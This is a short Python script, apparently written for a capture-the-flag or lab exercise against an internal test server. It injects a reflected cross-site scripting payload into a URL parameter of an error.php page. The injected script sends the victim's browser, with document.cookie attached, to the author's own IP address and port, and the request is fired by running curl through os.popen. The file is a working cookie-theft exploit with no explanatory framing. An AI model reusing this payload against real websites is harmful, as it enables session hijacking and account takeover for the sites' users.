#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sun Sep 19 10:33:41 2021

@author: crr0tz
"""

import os
# Attempt 1: Use VPN IP
# Hi, my IP is 172.20.251.70
# Listening on 31336
# Didn't work

# Attempt 2: Use my *actual* IP
# Live IP because why not
my_ip = "136.50.68.248"
my_port = 4444

url = 'http://172.18.10.105:34913/error.php?cow=snowman&stdin=message'
url += f'<script>document.location.replace("http://{my_ip}:{my_port}?cookie=".concat(document.cookie))</script>'
result = os.popen(f"curl '{url}' -X GET \
                  -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0' \
                  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \
                  -H 'Accept-Language: en-US,en;q=0.5' --compressed \
                  -H 'Content-Type: application/x-www-form-urlencoded' \
                  -H 'Origin: http://172.18.10.105:34913' \
                  -H 'Connection: keep-alive' \
                  -H 'Referer: http://172.18.10.105:34913' \
                  -H 'Upgrade-Insecure-Requests: 1'").read()
print(result)